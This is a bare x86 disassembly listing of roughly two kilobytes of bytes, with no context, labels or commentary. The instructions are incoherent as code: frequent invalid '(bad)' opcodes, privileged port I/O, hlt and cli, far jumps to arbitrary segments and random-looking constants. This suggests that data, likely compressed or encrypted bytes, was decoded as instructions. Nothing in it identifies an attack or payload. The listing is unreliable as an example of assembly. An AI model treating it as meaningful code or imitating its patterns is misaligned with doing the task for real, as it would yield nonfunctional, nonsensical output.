  420bde:	sbb    BYTE PTR [edi+0x54],0x4e
  420be2:	sub    al,0xe5
  420be4:	sbb    BYTE PTR [eax],ch
  420be6:	adc    edi,DWORD PTR [ebp-0x68]
  420be9:	mov    bh,0x99
  420beb:	push   0x86016380
  420bf0:	dec    edx
  420bf1:	sbb    edx,DWORD PTR [ecx]
  420bf3:	stc    
  420bf4:	leave  
  420bf5:	in     eax,dx
  420bf6:	adc    bl,BYTE PTR [edi+0x39]
  420bf9:	sub    DWORD PTR [ebx+0x55],esi
  420bfc:	(bad)  [edx-0x5]
  420bff:	mov    DWORD PTR [eax+0x3c52c7e0],ebp
  420c05:	push   0x187108d7
  420c0a:	(bad)  
  420c0c:	mov    DWORD PTR [ecx],eax
  420c0e:	enter  0x694f,0x40
  420c12:	les    eax,FWORD PTR [edx+0x4b]
  420c15:	ret    0x9b45
  420c18:	sub    dh,cl
  420c1a:	push   0x72
  420c1c:	pop    esi
  420c1d:	je     0x420c97
  420c1f:	scas   eax,DWORD PTR es:[edi]
  420c20:	out    0xc6,eax
  420c22:	sbb    eax,DWORD PTR [ebx+0x4a]
  420c25:	out    0x96,eax
  420c27:	and    DWORD PTR [ebx+0x6a1cd255],esp
  420c2d:	gs out dx,al
  420c2f:	dec    eax
  420c30:	dec    esi
  420c31:	inc    ecx
  420c32:	pop    ebx
  420c33:	adc    bh,BYTE PTR [ecx]
  420c35:	mov    edx,0x916fb06b
  420c3a:	cwde   
  420c3b:	xchg   esp,eax
  420c3c:	xchg   ecx,eax
  420c3d:	add    ah,BYTE PTR [ebx+0x2526fe6f]
  420c43:	push   edi
  420c44:	cwde   
  420c45:	dec    edx
  420c46:	lods   al,BYTE PTR ds:[esi]
  420c47:	jmp    0x7dd4b2c0
  420c4c:	lods   eax,DWORD PTR ds:[esi]
  420c4d:	jne    0x420c57
  420c4f:	loop   0x420c05
  420c51:	ja     0x420c0e
  420c53:	lahf   
  420c54:	ds jnp 0x420c21
  420c57:	ret    
  420c58:	sub    dl,BYTE PTR [edi+0x1975644c]
  420c5e:	add    eax,0xc8f5b3e2
  420c63:	xchg   edx,eax
  420c64:	sbb    dh,ah
  420c66:	ins    BYTE PTR es:[edi],dx
  420c67:	stos   BYTE PTR es:[edi],al
  420c68:	div    al
  420c6a:	and    al,0x3b
  420c6c:	pop    edi
  420c6d:	add    dh,bh
  420c6f:	dec    ebx
  420c70:	shld   ebp,ebp,cl
  420c73:	jg     0x420ca3
  420c75:	pop    ss
  420c76:	mov    eax,ds:0x15a956dc
  420c7b:	sub    BYTE PTR [ecx-0x4c],bh
  420c7e:	loop   0x420c34
  420c80:	loope  0x420c8f
  420c82:	nop
  420c83:	imul   ebx,DWORD PTR [esi-0x42],0xffffff8f
  420c87:	loop   0x420ccc
  420c89:	mov    BYTE PTR ds:0xade576f3,ah
  420c8f:	ja     0x420ce5
  420c91:	mov    eax,ds:0x4e875e16
  420c96:	fdivr  DWORD PTR [ebp-0x56604e7a]
  420c9c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420c9d:	js     0x420c70
  420c9f:	add    ah,BYTE PTR [ebp-0x15]
  420ca2:	add    DWORD PTR es:[edi],ebp
  420ca5:	retf   
  420ca6:	mov    ds:0xf3e13b64,eax
  420cab:	jg     0x420c3f
  420cad:	push   es
  420cae:	mov    DWORD PTR [ebx-0x36],esp
  420cb1:	shl    DWORD PTR [edx+0x49],1
  420cb4:	cmc    
  420cb5:	fcom   QWORD PTR [edx+0xb568bf7]
  420cbb:	jp     0x420ca2
  420cbd:	xor    DWORD PTR [ecx+0x3f],ecx
  420cc0:	gs stos DWORD PTR es:[edi],eax
  420cc2:	in     al,0xf1
  420cc4:	stc    
  420cc5:	sbb    al,BYTE PTR [esp+esi*4-0x40]
  420cc9:	and    al,0x21
  420ccb:	int3   
  420ccc:	pop    eax
  420ccd:	je     0x420d4b
  420ccf:	inc    ecx
  420cd0:	push   ebx
  420cd1:	out    dx,eax
  420cd2:	js     0x420d50
  420cd4:	push   esp
  420cd5:	push   edi
  420cd6:	icebp  
  420cd7:	inc    ebp
  420cd8:	icebp  
  420cd9:	(bad)  
  420cda:	es cmp eax,0x825126d6
  420ce0:	mov    dh,0x22
  420ce2:	sub    edx,DWORD PTR [edi+edi*4]
  420ce5:	add    DWORD PTR [esi+esi*1-0x21],eax
  420ce9:	daa    
  420cea:	(bad)  
  420cec:	push   ebx
  420ced:	ja     0x420c8d
  420cef:	pop    ebp
  420cf0:	std    
  420cf1:	daa    
  420cf2:	fidivr WORD PTR [edx-0x44118375]
  420cf8:	shl    ecx,1
  420cfa:	jecxz  0x420d4f
  420cfc:	inc    ebp
  420cfd:	fld    QWORD PTR [edx-0x47]
  420d00:	xor    DWORD PTR [ecx],ebx
  420d02:	adc    al,BYTE PTR [edi]
  420d04:	mov    ah,0xdd
  420d06:	sub    al,BYTE PTR [eax+0x69d92c9e]
  420d0c:	cli    
  420d0d:	idiv   BYTE PTR [edx]
  420d0f:	mov    ebx,0x234dbaeb
  420d14:	leave  
  420d15:	adc    al,0x88
  420d17:	icebp  
  420d18:	leave  
  420d19:	lock test eax,0x7b066f1a
  420d1f:	sub    al,0x56
  420d21:	xchg   ebx,eax
  420d22:	lods   eax,DWORD PTR ds:[esi]
  420d23:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420d24:	(bad)  
  420d25:	inc    eax
  420d27:	test   al,bh
  420d29:	or     DWORD PTR [edi-0x31d64474],ebp
  420d2f:	dec    esp
  420d30:	enter  0x70d1,0x6e
  420d34:	cmps   BYTE PTR fs:[esi],BYTE PTR es:[edi]
  420d36:	add    eax,0xe5fc18a1
  420d3b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420d3c:	hlt    
  420d3d:	cs call 0xa63c:0x123bb3e2
  420d45:	jmp    0x5932:0xeb9ad160
  420d4c:	inc    ecx
  420d4d:	out    dx,al
  420d4e:	jne    0x420d03
  420d50:	mov    ebp,DWORD PTR [eax+edi*8]
  420d53:	and    BYTE PTR ds:0x99b70bb5,bl
  420d59:	mov    DWORD PTR [esi-0x23],esp
  420d5c:	inc    eax
  420d5d:	pop    ebx
  420d5e:	fcomp  st(2)
  420d60:	pop    ebx
  420d61:	dec    edx
  420d62:	pop    ecx
  420d63:	loopne 0x420d35
  420d65:	cmc    
  420d66:	stos   BYTE PTR es:[edi],al
  420d67:	sbb    DWORD PTR ds:0x90f6e8e1,ebp
  420d6d:	sbb    edx,esi
  420d6f:	pop    eax
  420d70:	add    eax,0x66828f85
  420d75:	jb     0x420dac
  420d77:	inc    ebp
  420d78:	push   edi
  420d79:	pop    edi
  420d7a:	mov    ebx,0x3a280c0
  420d7f:	test   al,0x4f
  420d81:	and    eax,0x1d11aabe
  420d86:	pushf  
  420d87:	adc    ebx,edx
  420d89:	jecxz  0x420da9
  420d8b:	push   ecx
  420d8c:	jmp    0x84dc:0x2d03fd4e
  420d93:	jb     0x420d65
  420d95:	and    DWORD PTR [esi+0xc],esi
  420d98:	or     BYTE PTR [edx-0xd],0x2b
  420d9c:	cdq    
  420d9d:	aaa    
  420d9e:	add    dl,BYTE PTR [ebp-0x6353ed7b]
  420da4:	js     0x420d8a
  420da6:	jnp    0x420d9a
  420da8:	jg     0x420d72
  420daa:	push   edx
  420dab:	adc    cl,BYTE PTR [edi]
  420dad:	aad    0x26
  420daf:	fwait
  420db0:	sub    esp,0xfffffffe
  420db3:	cli    
  420db4:	add    al,0xc1
  420db6:	xchg   esp,eax
  420db7:	adc    ch,bl
  420db9:	aas    
  420dba:	pushf  
  420dbb:	scas   al,BYTE PTR es:[edi]
  420dbc:	or     BYTE PTR [ecx+0x8591569],ch
  420dc2:	sub    ch,BYTE PTR [edi]
  420dc4:	mov    ebx,0xd3082d5f
  420dc9:	enter  0xd2a0,0x1a
  420dcd:	sahf   
  420dce:	jo     0x420daa
  420dd0:	fdivr  DWORD PTR [esi-0x6b977080]
  420dd6:	xchg   edx,eax
  420dd7:	add    al,0x59
  420dd9:	(bad)  
  420dda:	cli    
  420ddb:	inc    esp
  420ddc:	cmp    bh,cl
  420dde:	push   eax
  420ddf:	add    bl,BYTE PTR [edx-0x4b]
  420de2:	call   DWORD PTR ds:0x4d0a1c83
  420de8:	ror    BYTE PTR [ebp-0x6a3e5fd3],0x95
  420def:	(bad)  [esi]
  420df1:	retf   
  420df2:	jmp    0xcd1e8a0b
  420df7:	jmp    0xdf04abca
  420dfc:	inc    ebx
  420dfd:	hlt    
  420dfe:	inc    ebp
  420dff:	mov    ds:0x57e94024,al
  420e04:	pop    esi
  420e05:	stos   DWORD PTR es:[edi],eax
  420e06:	add    al,0xb6
  420e08:	jne    0x420e42
  420e0a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420e0b:	jnp    0x420e80
  420e0d:	sub    edi,DWORD PTR [ecx-0x42]
  420e10:	sbb    al,0x74
  420e12:	arpl   WORD PTR [edx+0x9c594f8],dx
  420e18:	repz inc edx
  420e1a:	xor    al,0x98
  420e1c:	adc    ah,BYTE PTR [eax+0xe33d6aa]
  420e22:	add    DWORD PTR [ebp-0x62c58a67],0x79
  420e29:	xchg   edi,eax
  420e2a:	push   edx
  420e2b:	jbe    0x420e57
  420e2d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420e2e:	push   es
  420e2f:	pop    ds
  420e30:	push   0x11508e7f
  420e35:	or     dl,BYTE PTR [edx-0x4f]
  420e38:	bnd jmp 0x420e6f
  420e3b:	mov    eax,0xb9a63d15
  420e40:	int3   
  420e41:	jecxz  0x420e07
  420e43:	lahf   
  420e44:	loope  0x420de2
  420e46:	jl     0x420e68
  420e48:	mov    ebp,0x5b8ddba
  420e4d:	inc    esi
  420e4e:	xlat   BYTE PTR ds:[ebx]
  420e4f:	adc    eax,0x918475a3
  420e54:	in     eax,dx
  420e55:	(bad)  
  420e56:	sbb    eax,0xef0b13db
  420e5b:	sub    cl,BYTE PTR [eax-0x3967dfa1]
  420e61:	mov    al,0xce
  420e63:	arpl   WORD PTR [edx+0x3],di
  420e66:	pusha  
  420e67:	xchg   ebp,eax
  420e68:	adc    eax,0x51a768e
  420e6d:	push   ss
  420e6e:	cwde   
  420e6f:	pop    DWORD PTR [edx+0x7d]
  420e72:	int    0x85
  420e74:	mov    ecx,0xf61d0cff
  420e79:	rcr    DWORD PTR [ecx-0x7e],cl
  420e7c:	inc    ebx
  420e7d:	lahf   
  420e7e:	jno    0x420e8f
  420e80:	xchg   DWORD PTR [eax+0x4a29cfcc],edx
  420e86:	mov    bh,0x24
  420e88:	enter  0xe86a,0x50
  420e8c:	call   0x9e61:0x667b5115
  420e93:	adc    BYTE PTR [ebp-0x7a],ah
  420e96:	call   0x3c7c:0x863486e7
  420e9d:	mov    al,ds:0x24b288b
  420ea2:	outs   dx,DWORD PTR ds:[esi]
  420ea3:	scas   al,BYTE PTR es:[edi]
  420ea4:	out    dx,al
  420ea5:	xchg   ebx,eax
  420ea6:	xchg   BYTE PTR [ecx+0x65],cl
  420ea9:	jecxz  0x420f10
  420eab:	and    DWORD PTR ds:0x55f28641,eax
  420eb1:	sbb    al,0xce
  420eb3:	jo     0x420efa
  420eb5:	sub    eax,0xcc31f4e1
  420eba:	fwait
  420ebb:	shl    edi,1
  420ebd:	lods   eax,DWORD PTR ds:[esi]
  420ebe:	mov    WORD PTR [edi+0x23b48d39],ds
  420ec4:	mov    ebx,0x8332427d
  420ec9:	inc    esi
  420eca:	adc    al,BYTE PTR [eax+0x3a84bd5e]
  420ed0:	mov    eax,ds:0xdfbc261a
  420ed5:	xor    eax,0xb2a27a4c
  420eda:	sub    DWORD PTR [esi-0x196a584a],edx
  420ee0:	dec    eax
  420ee1:	jno    0x420eae
  420ee3:	push   es
  420ee4:	sbb    al,0x5e
  420ee6:	jge    0x420ef0
  420ee8:	mov    al,0x93
  420eea:	add    al,0x4b
  420eec:	jmp    0xfc2c1678
  420ef1:	popa   
  420ef2:	push   ss
  420ef3:	int    0x2a
  420ef5:	fnsave [esi-0x69ac0b7e]
  420efb:	jle    0x420ec5
  420efd:	mov    edi,0x8ed7674
  420f02:	mov    BYTE PTR [ecx+0x37d9795e],dh
  420f08:	mov    esi,0x612db472
  420f0d:	jle    0x420f1c
  420f0f:	pop    ecx
  420f10:	dec    esi
  420f11:	iret   
  420f12:	xor    esp,DWORD PTR [edx+0x78a65812]
  420f18:	les    edx,FWORD PTR [ecx]
  420f1a:	and    BYTE PTR [eax],0xc9
  420f1d:	inc    edi
  420f1e:	inc    ebx
  420f1f:	loop   0x420f01
  420f21:	cmp    dh,BYTE PTR [edx+ebp*1-0x6b27e242]
  420f28:	adc    DWORD PTR [eax],esi
  420f2a:	pop    es
  420f2b:	jae    0x420f70
  420f2d:	test   DWORD PTR [eax],0xc7ef98db
  420f33:	les    ecx,FWORD PTR ds:0xef4d00a6
  420f39:	mov    ch,dh
  420f3b:	inc    eax
  420f3c:	pop    ebp
  420f3d:	ret    
  420f3e:	lahf   
  420f3f:	cmp    al,0xce
  420f41:	retf   0x7175
  420f44:	and    DWORD PTR [ebx+0x3],ebx
  420f47:	adc    ch,BYTE PTR [ebx-0x77d28aaf]
  420f4d:	and    cl,ah
  420f4f:	leave  
  420f50:	adc    bh,bh
  420f52:	scas   eax,DWORD PTR es:[edi]
  420f53:	enter  0xb95a,0xfb
  420f57:	or     al,0xe4
  420f59:	repz popa 
  420f5b:	lds    eax,FWORD PTR [ecx+0x3a]
  420f5e:	xchg   ebp,eax
  420f5f:	add    BYTE PTR [ecx+0x44],bh
  420f62:	or     al,0x90
  420f64:	(bad)  
  420f65:	retf   0xf468
  420f68:	mov    ch,0xa5
  420f6a:	mov    ecx,0xa70d6fad
  420f6f:	pop    eax
  420f70:	sbb    ecx,DWORD PTR [edx]
  420f72:	cmp    eax,0xc7e6ce75
  420f77:	xchg   ecx,eax
  420f78:	jle    0x420fca
  420f7a:	jp     0x420fb5
  420f7c:	adc    dl,BYTE PTR [esi-0x45]
  420f7f:	jecxz  0x420f73
  420f81:	push   ebp
  420f82:	retf   
  420f83:	jns    0x420f92
  420f85:	int    0x3b
  420f87:	div    DWORD PTR [ecx-0x4d63a316]
  420f8d:	mov    ebp,0xb5b0772
  420f92:	add    al,0x15
  420f94:	call   0x2203:0x84073c5d
  420f9b:	(bad)  
  420f9c:	lods   al,BYTE PTR ds:[esi]
  420f9d:	sub    esp,DWORD PTR [ebx+ecx*1]
  420fa0:	loop   0x420f90
  420fa2:	jnp    0x420fa1
  420fa4:	mov    BYTE PTR [ecx-0x3607320d],ah
  420faa:	in     eax,0x16
  420fac:	(bad)  
  420fad:	rcl    cl,1
  420faf:	sub    BYTE PTR [edx-0x2e],ch
  420fb2:	iret   
  420fb3:	fadd   st,st(2)
  420fb5:	das    
  420fb6:	adc    DWORD PTR [edx],esi
  420fb8:	cmp    ebx,DWORD PTR [eax+0x46]
  420fbb:	mov    al,BYTE PTR [esi-0x23]
  420fbe:	cmp    BYTE PTR [ebp+0x11],al
  420fc1:	pop    ss
  420fc2:	sbb    bl,BYTE PTR [ebx]
  420fc4:	sbb    DWORD PTR [ebx],eax
  420fc6:	pop    esp
  420fc7:	inc    eax
  420fc8:	rcr    DWORD PTR [edx+eiz*1-0x3f22fdba],cl
  420fcf:	or     ah,0x7d
  420fd2:	jbe    0x421032
  420fd4:	sub    BYTE PTR [esi-0x4a47ecd0],ah
  420fda:	std    
  420fdb:	ds (bad) 
  420fdd:	retf   
  420fde:	je     0x42100a
  420fe0:	outs   dx,DWORD PTR ds:[esi]
  420fe1:	not    DWORD PTR [eax+0x47]
  420fe4:	add    edx,ecx
  420fe6:	and    al,0xeb
  420fe8:	push   edi
  420fe9:	mov    ebx,0x2cee95cb
  420fee:	add    dl,dh
  420ff0:	push   edi
  420ff1:	stos   BYTE PTR es:[edi],al
  420ff2:	rol    BYTE PTR [ecx+eiz*2+0xc83914d],0x4c
  420ffa:	push   ds
  420ffb:	xor    DWORD PTR [esi-0x4e],edi
  420ffe:	(bad)  
  421000:	mov    bl,0xeb
  421002:	or     BYTE PTR [eax-0x689be72b],bl
  421008:	in     eax,0xb9
  42100a:	pop    ebp
  42100b:	(bad)  
  42100c:	push   ds
  42100d:	neg    BYTE PTR [edi+0x264f8946]
  421013:	ror    cl,1
  421015:	jmp    0x421033
  421017:	iret   
  421018:	lds    edi,FWORD PTR [ecx+0x5c]
  42101b:	jb     0x42108d
  42101d:	sahf   
  42101e:	mov    DWORD PTR [ebp-0x56],edi
  421021:	aam    0x89
  421023:	(bad)  
  421024:	out    dx,al
  421025:	mov    bh,0x4
  421027:	loop   0x421084
  421029:	add    DWORD PTR [ebx+0x7d],edi
  42102c:	xchg   esp,ebp
  42102e:	mul    BYTE PTR [eax]
  421030:	(bad)  
  421031:	fldcw  WORD PTR [eax+ebx*8+0x5170f1ca]
  421038:	mov    ds:0xd8c74946,al
  42103d:	xor    al,0x51
  42103f:	idiv   BYTE PTR [edx]
  421041:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421042:	add    ebx,0x75
  421045:	stos   BYTE PTR es:[edi],al
  421046:	xchg   ebp,eax
  421047:	xchg   edx,eax
  421048:	push   0x9160dd21
  42104d:	mov    al,0xb4
  42104f:	mov    ecx,0x29e2397
  421054:	lock hlt 
  421056:	mov    ch,0x3c
  421058:	fidivr DWORD PTR [esi]
  42105a:	leave  
  42105b:	push   ecx
  42105c:	les    eax,FWORD PTR [edx]
  42105e:	inc    esp
  42105f:	lea    edx,[esi+ebx*2]
  421062:	add    edx,edi
  421064:	xchg   edi,eax
  421065:	lds    ebp,FWORD PTR [eax]
  421067:	xor    DWORD PTR [ecx-0x387532a3],eax
  42106d:	xor    ebp,DWORD PTR [edi]
  42106f:	xor    al,0x9a
  421071:	int    0x23
  421073:	scas   al,BYTE PTR es:[edi]
  421074:	ret    0x7d42
  421077:	push   ss
  421078:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421079:	add    BYTE PTR ds:0x7aaa779d,0xc2
  421080:	(bad)  
  421081:	sub    eax,0x8d6a45a6
  421086:	ret    
  421087:	and    eax,0xa44ff781
  42108c:	adc    eax,0x12d12309
  421091:	push   ecx
  421092:	cmp    ebx,edi
  421094:	int    0xa4
  421096:	pop    esp
  421097:	add    DWORD PTR [esi+0x20],0xffffff91
  42109b:	add    eax,0x52549de3
  4210a0:	adc    ecx,DWORD PTR [ebp-0x39]
  4210a3:	jge    0x42111d
  4210a5:	repz xlat BYTE PTR ds:[ebx]
  4210a7:	movups xmm5,XMMWORD PTR [edi-0x5a]
  4210ab:	sub    al,0xef
  4210ad:	pop    es
  4210ae:	jbe    0x421054
  4210b0:	sti    
  4210b1:	push   ebp
  4210b2:	dec    ebp
  4210b3:	and    dh,BYTE PTR [edi]
  4210b5:	sar    BYTE PTR [ebx+ecx*4-0x2a],cl
  4210b9:	and    esi,DWORD PTR [ebx+0xb7184e2]
  4210bf:	mov    ah,0x19
  4210c1:	bound  esi,QWORD PTR [eax-0x788e21f1]
  4210c7:	enter  0xf1a6,0x78
  4210cb:	lock gs test eax,0x5bda5dc
  4210d2:	jge    0x42114e
  4210d4:	cmp    eax,0x5aab4a67
  4210d9:	jge    0x42109a
  4210db:	fwait
  4210dc:	push   ebp
  4210dd:	push   eax
  4210de:	rcr    al,0x98
  4210e1:	push   cs
  4210e2:	and    DWORD PTR [edx+0x41c69354],eax
  4210e8:	cmp    edx,DWORD PTR [esi+eax*8-0x2f55419d]
  4210ef:	das    
  4210f0:	add    eax,DWORD PTR [eax-0x5e1d64a0]
  4210f6:	cwde   
  4210f7:	adc    bh,BYTE PTR [edx+0x7886b28b]
  4210fd:	sub    ecx,DWORD PTR [esp+edi*1-0x5051c6c5]
  421104:	cmp    BYTE PTR [esi-0x3e],ah
  421107:	ja     0x4210f1
  421109:	pop    ss
  42110a:	cmc    
  42110b:	mov    ecx,DWORD PTR [ecx-0x3a]
  42110e:	aam    0xb
  421110:	mov    bh,0x25
  421112:	stc    
  421113:	arpl   WORD PTR [ecx],cx
  421115:	inc    edi
  421116:	retf   0x2270
  421119:	ins    BYTE PTR es:[edi],dx
  42111a:	dec    ecx
  42111b:	adc    esp,DWORD PTR [ebx+0x39427445]
  421121:	sub    al,BYTE PTR [edx-0x30]
  421124:	pop    ebp
  421125:	push   ss
  421126:	mov    bl,0x32
  421128:	mov    bh,BYTE PTR [ebx+0x70]
  42112b:	xor    eax,0xdec76765
  421130:	mov    esp,fs
  421132:	call   0x6f45e5d
  421137:	repnz out 0x5f,eax
  42113a:	ins    DWORD PTR es:[edi],dx
  42113b:	xchg   ebx,eax
  42113c:	out    0xe5,al
  42113e:	call   0xcc39:0x51f10ebe
  421145:	je     0x421185
  421147:	pop    esi
  421148:	or     eax,0x470641d1
  42114d:	aas    
  42114e:	(bad)  
  42114f:	mov    esp,0xd31fd319
  421154:	inc    edx
  421155:	js     0x4210fc
  421157:	ror    edi,0xef
  42115a:	mov    al,ds:0xc640822
  42115f:	xchg   ebx,eax
  421160:	leave  
  421161:	pushf  
  421162:	test   esp,esi
  421164:	and    BYTE PTR [ecx],ch
  421166:	and    edx,eax
  421168:	ret    
  421169:	mov    BYTE PTR [ecx-0x7b],ah
  42116c:	and    al,0x62
  42116e:	mov    DWORD PTR [ebp-0x5070824f],eax
  421174:	mov    bl,0xc9
  421176:	cdq    
  421177:	imul   edx,ecx,0xfb3ceb9e
  42117d:	mov    edx,0x86cb8ac7
  421182:	pop    esp
  421183:	jmp    0x3e5d:0x72c1ed62
  42118a:	mov    al,0x7d
  42118c:	dec    edi
  42118d:	aas    
  42118e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42118f:	xlat   BYTE PTR ds:[ebx]
  421190:	fnstenv [ebx+0x1d]
  421193:	fadd   st(6),st
  421195:	adc    dh,BYTE PTR [esi-0xbc9367]
  42119b:	cmp    eax,0xf57eea8e
  4211a0:	xor    ch,BYTE PTR [ebx+0x36]
  4211a3:	xchg   esp,eax
  4211a4:	add    al,0x93
  4211a6:	loop   0x421183
  4211a8:	aad    0xa7
  4211aa:	test   al,0xf6
  4211ac:	jle    0x4211aa
  4211ae:	pusha  
  4211af:	jbe    0x421216
  4211b1:	or     BYTE PTR [eax+0x3b],ah
  4211b4:	aas    
  4211b5:	cmp    al,0xed
  4211b7:	scas   eax,DWORD PTR es:[edi]
  4211b8:	lea    edi,[esi]
  4211ba:	mov    esp,0x1f7b1f0e
  4211bf:	movups xmm4,XMMWORD PTR [eax+eiz*4+0x1]
  4211c4:	mov    dh,0xa
  4211c6:	mov    ah,0x65
  4211c8:	sub    eax,0x9509e1b6
  4211cd:	shr    DWORD PTR [ebx+0x62],cl
  4211d0:	cmp    edx,DWORD PTR [ebx-0x8]
  4211d3:	ds jle 0x4211c5
  4211d6:	xchg   esi,eax
  4211d7:	mov    BYTE PTR cs:[edx+0xaae518b],cl
  4211de:	mov    esp,0x298b3bbc
  4211e3:	or     BYTE PTR [ebx+ebx*8-0x68],dh
  4211e7:	pop    ebp
  4211e8:	mov    al,0x5
  4211ea:	mov    ebp,0x6959d293
  4211ef:	lods   eax,DWORD PTR es:[esi]
  4211f1:	pop    ebp
  4211f2:	add    ch,BYTE PTR [ecx+edx*1+0x65992e44]
  4211f9:	xchg   edi,eax
  4211fa:	loopne 0x421257
  4211fc:	pop    eax
  4211fd:	jo     0x421268
  4211ff:	dec    eax
  421200:	dec    esp
  421201:	sbb    al,0x7a
  421203:	fisubr DWORD PTR [ebp-0x23ad8c70]
  421209:	inc    esp
  42120a:	lock and bl,BYTE PTR ds:0xfd0bc999
  421211:	ret    0x11b1
  421214:	mov    cl,0x7b
  421216:	loopne 0x421295
  421218:	or     DWORD PTR [esp+0x30],ecx
  42121c:	xor    eax,0x6ae4d365
  421221:	ins    BYTE PTR es:[edi],dx
  421222:	jb     0x4211ec
  421224:	or     DWORD PTR [eax-0x4ad90ddf],eax
  42122a:	dec    edx
  42122b:	icebp  
  42122c:	mov    BYTE PTR [eax],dl
  42122e:	mov    al,0xde
  421230:	pop    edi
  421231:	dec    edx
  421232:	js     0x42127f
  421234:	mov    dl,BYTE PTR [bp-0x5557]
  421239:	xchg   ecx,eax
  42123a:	xchg   BYTE PTR ds:0x52e2274,cl
  421240:	sbb    DWORD PTR [edi+0x74],esi
  421243:	loop   0x4211db
  421245:	jmp    0xcf3f659
  42124a:	imul   edi,DWORD PTR [ecx+0x26],0x6b
  42124e:	sbb    ch,BYTE PTR [ebx-0x51]
  421251:	je     0x4212cf
  421253:	test   eax,0x94334e6c
  421258:	sub    al,0x40
  42125a:	jns    0x4211fc
  42125c:	out    0xde,al
  42125e:	aaa    
  42125f:	inc    esi
  421260:	push   esi
  421261:	mov    bl,dl
  421263:	js     0x4212cb
  421265:	jbe    0x421267
  421267:	mov    cs,WORD PTR [edx]
  421269:	shl    DWORD PTR [di-0x1a],cl
  42126d:	mov    ebx,0x1f5dad03
  421272:	jno    0x4212b2
  421274:	jno    0x421240
  421276:	call   0x102a262b
  42127b:	test   eax,edx
  42127d:	pop    ecx
  42127e:	cwde   
  42127f:	xchg   ecx,eax
  421280:	out    0xdd,eax
  421282:	push   esp
  421283:	pop    eax
  421284:	je     0x421233
  421286:	idiv   DWORD PTR [ebx-0x19e6e1d8]
  42128c:	(bad)  
  42128d:	out    0x6c,eax
  42128f:	sub    DWORD PTR [ecx+0x33],ecx
  421292:	jecxz  0x421218
  421294:	jmp    0x4212ad
  421296:	test   ch,0x58
  421299:	sbb    BYTE PTR [ecx],dh
  42129b:	mov    edi,0xcd4950c6
  4212a0:	mov    al,0xed
  4212a2:	jne    0x421251
  4212a4:	test   al,0xce
  4212a6:	jl     0x42122c
  4212a8:	sub    DWORD PTR [ecx+0x3c],0x34
  4212ac:	enter  0xb708,0x20
  4212b0:	mov    esp,0xecbde40a
  4212b5:	fnstenv [esi]
  4212b7:	sub    al,0xcb
  4212b9:	xchg   BYTE PTR [edi+0x59],dl
  4212bc:	jmp    0x8a937ac7
  4212c1:	mov    ds:0xee365fb,al
  4212c6:	dec    edx
  4212c7:	pop    ecx
  4212c8:	mov    bh,0x7f
  4212ca:	arpl   WORD PTR [eax],bx
  4212cc:	bound  ebx,QWORD PTR ds:0xf120f509
  4212d2:	dec    ebx
  4212d3:	clc    
  4212d4:	xchg   bh,ah
  4212d6:	daa    
  4212d7:	xchg   edx,eax
  4212d8:	push   es
  4212d9:	mov    bl,BYTE PTR [ebp-0x12]
  4212dc:	push   ss
  4212dd:	push   esp
  4212de:	inc    edx
  4212df:	(bad)  
  4212e2:	sub    al,BYTE PTR [eax]
  4212e4:	mov    ss,WORD PTR [edi-0xff65f9e]
  4212ea:	dec    ecx
  4212eb:	inc    DWORD PTR [ebx]
  4212ed:	fnsave [ecx]
  4212ef:	cli    
  4212f0:	data16 jp 0x421345
  4212f3:	add    al,0xc9
  4212f5:	jnp    0x4212cd
  4212f7:	pop    edx
  4212f8:	icebp  
  4212f9:	pop    ebx
  4212fa:	and    eax,0xd83bc25
  4212ff:	cwde   
  421300:	sub    BYTE PTR [ebx+esi*8],cl
  421303:	into   
  421304:	add    ecx,DWORD PTR [edx+0x45]
  421307:	retf   0x9781
  42130a:	push   ebx
  42130b:	lds    ecx,FWORD PTR [ecx+0x41253bfa]
  421311:	or     al,0x9f
  421313:	iret   
  421314:	xchg   DWORD PTR [edx-0x5ecbdb3b],esp
  42131a:	dec    ebx
  42131b:	sbb    BYTE PTR [ecx],al
  42131d:	fld    QWORD PTR [ecx-0x6f]
  421320:	xlat   BYTE PTR ds:[ebx]
  421321:	mov    edi,0xe46a9a1
  421326:	cli    
  421327:	clc    
  421328:	inc    edi
  421329:	and    al,0x9e
  42132b:	mov    cs,WORD PTR [ebx+0x117acd43]
  421331:	test   BYTE PTR [ecx+0x1d57902c],0x2a
  421338:	or     esp,0xc3c311af
  42133e:	outs   dx,DWORD PTR ds:[esi]
  42133f:	pop    es
  421340:	ss cwde 
  421342:	or     BYTE PTR [ecx-0x5146488f],bl
  421348:	mov    ebx,0x9f07500d
  42134d:	(bad)  
  42134e:	js     0x4213cf
  421350:	shr    DWORD PTR [ebx+esi*2+0x5e91d898],1
  421357:	xor    eax,0x6132d1da
  42135c:	xchg   ebp,eax
  42135d:	mov    cl,BYTE PTR [ecx]
  42135f:	retf   
  421360:	cli    
  421361:	sub    DWORD PTR [ecx-0x59],0xffffff80
  421365:	es dec eax
  421367:	xchg   esi,eax
  421368:	mov    dl,0x52
  42136a:	dec    esp
  42136b:	and    DWORD PTR [esi],esi
  42136d:	pop    ecx
  42136e:	je     0x4213b5
  421370:	std    
  421371:	popa   
  421372:	es sub al,0xbe
  421375:	push   0xfffffffc
  421377:	fiadd  WORD PTR ss:[eax]
  42137a:	out    dx,eax
  42137b:	in     eax,dx
  42137c:	and    DWORD PTR [eax],ebp
  42137e:	inc    eax
  42137f:	test   DWORD PTR [ebx],edi
  421381:	fs pop edx
  421383:	push   esp
  421384:	pop    es
  421385:	push   ss
  421386:	pusha  
  421387:	sbb    al,0xd8
  421389:	imul   edx,DWORD PTR [edx-0x24],0x7ca73cdb
  421390:	and    BYTE PTR [ebp-0x1c],dh
  421393:	dec    ecx
  421394:	or     ah,BYTE PTR [edx-0x67a8dfa3]
  42139a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42139b:	dec    ebx
  42139c:	xchg   edi,eax
  42139d:	js     0x4213c5
  42139f:	push   ecx
  4213a0:	ror    DWORD PTR [ecx],0x57
  4213a3:	retf   0xa31b
  4213a6:	cmp    dl,dh
  4213a8:	inc    eax
  4213a9:	push   ebp
  4213aa:	retf   
